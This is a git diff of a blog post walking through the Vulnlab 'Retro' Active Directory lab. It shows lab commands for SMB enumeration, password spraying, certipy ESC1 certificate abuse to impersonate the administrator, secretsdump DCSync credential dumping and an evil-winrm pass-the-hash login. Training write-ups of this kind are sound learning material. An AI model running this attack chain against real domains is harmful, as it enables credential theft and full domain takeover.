@@ -3,13 +3,13 @@ layout: post
 title: Vulnlab - Retro Walkthrough
 date: 19-04-2025
 categories: [Vulnlab]
-tags: [pre2k, changepasswd, ADCS,ESC1, certipy]
+tags: [changepasswd, pre2k, ADCS, ESC1, certipy, TGT]
 image: "https://assets.vulnlab.com/retro_slide.png"
 ---
 
 ## Introduction
 
-Welcome back to my Active Directory exploitation series from Vulnlab! In the previous post, we tackled `Baby2`, where we explored `ACL` abuse and `GPO` misconfigurations for privilege escalation within a Windows AD environment.
+Welcome back to my Active Directory exploitation series from Vulnlab! In the previous post, we tackled `Baby2`, where we explored `ACL abuse` and `GPO misconfigurations` for privilege escalation within a Windows AD environment.
 
 Today, we're diving into the next lab in the series `Retro`.
 
@@ -26,7 +26,7 @@ These two components are common in enterprise environments, and misconfiguration
 Before jumping into the exploitation phase, let’s break down the two main concepts this lab focuses on `Pre-Created Computer Accounts` and `Active Directory Certificate Services (ADCS)` in a beginner-friendly way.
 
 **Pre-Created Computer Accounts**
-> `Pre-Created Computer Accounts` In Active Directory environments, every computer that joins the domain gets its own account just like users do. Normally, these accounts are created during the domain join process. But sometimes, IT admins pre-create them ahead of time.Why? To control exactly how a machine joins the domain and what permissions it has. Here’s where it gets interesting for attackers, When a computer account is pre-created(if the "*Assign this computer account as a pre-Windows 2000 computer*" checkbox is `enabled`)), the computer account is given a default, predictable password, the account name in lowercase. For example, a computer account named `HRLaptop$` would have the password `hrlaptop`. 
+> `Pre-Created Computer Accounts` In Active Directory environments, every computer that joins the domain gets its own account just like users do. Normally, these accounts are created during the domain join process. But sometimes, IT admins pre-create them ahead of time.Why? To control exactly how a machine joins the domain and what permissions it has. Here’s where it gets interesting for attackers, When a computer account is pre-created(if the "*`Assign this computer account as a pre-Windows 2000 computer`*" checkbox is `enabled`)), the computer account is given a default, predictable password, the account name in lowercase. For example, a computer account named `HRLaptop$` would have the password `hrlaptop`. 
 {: .prompt-tip }
 
 **Active Directory Certificate Services (ADCS)**
@@ -48,10 +48,10 @@ Before jumping into the exploitation phase, let’s break down the two main conc
 > BloodHound: is a tool for Active Directory enumeration that maps out attack paths and privilege escalation opportunities in AD environments.
 {: .prompt-tip }
 
-> 
+> Impacket Changepasswd: is a tool that allows you to change the password of a user or machine account in Active Directory using RPC (Remote Procedure Call).
 {: .prompt-tip }
 
-> 
+> Certipy:  is a powerful tool used for attacking Active Directory Certificate Services (ADCS). It helps to Discover vulnerable certificate templates, Request certificates for users or machine accounts, Authenticate using those certificates (no password needed!). 
 {: .prompt-tip }
 
 > Impacket Secretsdump:  tool from the Impacket suite that is used to dump credentials, hashes, and other sensitive information from Windows machines.
@@ -107,7 +107,7 @@ Nmap done: 1 IP address (1 host up) scanned in 174.34 seconds
 
 ### SMB
 
-After running an Nmap scan, we identified several ports commonly seen in Active Directory environments. We began our enumeration with SMB, which revealed `Guest` access was enabled with an `empty password`. While browsing the available shares, we discovered that the Trainees share was readable.
+After running an Nmap scan, we identified several ports commonly seen in Active Directory environments. We began our enumeration with `SMB`, which revealed `Guest` access was enabled with an `empty password`. While browsing the available shares, we discovered that the Trainees share was readable.
 
 ```powershell
 nxc smb 10.10.79.94 -u 'Guest' -p '' --shares
@@ -135,7 +135,7 @@ nxc smb 10.10.79.94 -u loots/users.txt -p loots/users.txt  --no-bruteforce --con
 
 ![alt text](/assets/screenshots/Retro/4.png)
 
->With valid credentials in hand, the next typical step in Active Directory enumeration is to try pulling a list of all domain users and testing for common attacks like AS-REP Roasting (for users not requiring pre-authentication) and Kerberoasting (for service accounts with SPNs).However, in this lab, those techniques didn’t yield any results — so we’ll be diving deeper into these attacks in upcoming labs where they’re more relevant.
+>With valid credentials in hand, the next typical step in Active Directory enumeration is to try pulling a list of all domain users and testing for common attacks like `AS-REP Roasting` (for users not requiring pre-authentication) and `Kerberoasting` (for service accounts with `SPNs`).However, in this lab, those techniques didn’t yield any results, so we’ll be diving deeper into these attacks in upcoming labs where they’re more relevant.
 {: .prompt-tip }
 
 Users
@@ -161,7 +161,7 @@ GetNPUsers.py retro.vl/trainee:trainee -usersfile loots/users.txt  -dc-ip 10.10.
 ![alt text](/assets/screenshots/Retro/6.png)
 
 Enumerating Shares again
-Now that we had valid credentials, we went back to enumerating SMB shares a common and essential step in Active Directory assessments. In AD environments, access control varies between accounts, so it’s important to repeat enumeration whenever new credentials are discovered. You might uncover different shares, permissions, or hidden clues depending on the user.This time, using the trainee credentials, we were able to read from a previously inaccessible share called `Notes`. 
+Now that we had valid credentials, we went back to enumerating `SMB` shares a common and essential step in Active Directory assessments. In AD environments, access control varies between accounts, so it’s important to repeat enumeration whenever new credentials are discovered. You might uncover different shares, permissions, or hidden clues depending on the user.This time, using the `trainee` credentials, we were able to read from a previously inaccessible share called `Notes`. 
 
 ```powershell
 nxc smb 10.10.79.94 -u trainee -p trainee --shares
@@ -255,6 +255,10 @@ certipy find -u 'BANKING$' -p 'Password123!' -dc-ip "10.10.79.94" -debug
 
 After identifying that `ADCS` was running (`retro-DC-CA`), we moved forward to check for vulnerable certificate templates these are configurations within `ADCS` that, if misconfigured, can allow low-privileged users (or even computer accounts) to request certificates impersonating privileged accounts (like `Domain Admins`).
 
+**What Are Certificate Templates?**
+>In a Windows Active Directory Certificate Services (ADCS) environment, certificate templates are like blueprints used to create digital certificates.Think of a certificate template like a form you fill out at the bank — it already has predefined fields and rules. Depending on how the form is designed, some people may be allowed to fill it out, others not.
+{: .prompt-tip }
+
 This checks for templates that are known to be vulnerable like (Allow low-privileged users or machine accounts to request certificates, Allow client authentication, Don't require manager approval or certificate request signing).
 
 ```powershell
@@ -277,7 +281,7 @@ we discovered that one of the templates was vulnerable to `ESC1` Escalation.
 
 ### Exploting ESC1
 
-By default, the certificate request using this vulnerable template returns a .pfx file for the DC$ account. This certificate can then be used to perform a DCSync attack against the domain controller itself — allowing us to extract sensitive credentials like password hashes.
+By default, the certificate request using this vulnerable template returns a `.pfx` file for the `DC$` account. This certificate can then be used to perform a `DCSync` attack against the domain controller itself allowing us to extract sensitive credentials like password hashes.
 
 ```powershell
 certipy req -u 'BANKING$' -p 'Password123!' -dc-ip '10.10.79.94' -ca 'retro-DC-CA' -template 'RetroClients' -dns 'DC.retro.vl' -key-size 4096 -debug
@@ -293,7 +297,7 @@ This give use `NTLM` hash for `DC$`
 
 ![alt text](/assets/screenshots/Retro/20.png)
 
-To confirm it works, we can use netexec with the NT hash obtained after authentication.
+To confirm it works, we can use `netexec` with the `NT hash` obtained after authentication.
 
 ```powershell
 nxc smb 10.10.79.94 -u 'DC$' -H 532f3be569a64881ec82f1cc875059e3
@@ -304,14 +308,15 @@ nxc smb 10.10.79.94 -u 'DC$' -H 532f3be569a64881ec82f1cc875059e3
 Alternatively, as many attackers prefer, we can also manually specify a different user, such as `administrator`, in the request. This way, we directly obtain a certificate to authenticate as a `Domain Admin`.
 
 ```powershell
-certipy req -u 'BANKING$' -p 'Password123!' -dc-ip '10.10.73.65' -ca 'retro-DC-CA' -template 'RetroClients' -dns 'DC.retro.vl' -key-size 4096 -upn 'administrator@retro.vl'
+certipy req -u 'BANKING$' -p 'Password123!' -dc-ip '10.10.79.94' -ca 'retro-DC-CA' -template 'RetroClients' -dns 'DC.retro.vl' -key-size 4096 -upn 'administrator@retro.vl'
 ```
 
 then
 
 ```powershell
-certipy auth -pfx administrator.pfx -domain retro.vl
+certipy auth -pfx administrator_dc.pfx -domain retro.vl
 ```
+![alt text](/assets/screenshots/Retro/24.png)
 
 ## Privilege Escalation
 
@@ -329,14 +334,21 @@ secretsdump.py retro.vl/'DC$'@10.10.79.94 -hashes aad3b435b51404eeaad3b435b51404
 
 This gave us a full dump of user credentials, including password hashes. These can be cracked offline or used in pass-the-hash attacks to impersonate other users and move laterally within the network.
 
+```powershell
+evil-winrm -i retro.vl -u Administrator -H 252fac7066d93dd009d4fd2cd0368389
+```
+
 ## References
 
 [NetExec Cheatsheet](https://seriotonctf.github.io/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/)
 
-[Pre-Windows 2000 computers | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers)
+[Pre-Windows 2000 computers](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers)
 
 [Diving into Pre-Created Computer Accounts](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts)
 
 [Abusing AD Weak Permission Pre2K Compatibility](https://www.hackingarticles.in/abusing-ad-weak-permission-pre2k-compatibility/)
 
-[Certificate templates | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates)
+[Certificate templates](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates)
+
+[Certipy](https://github.com/ly4k/Certipy)
+
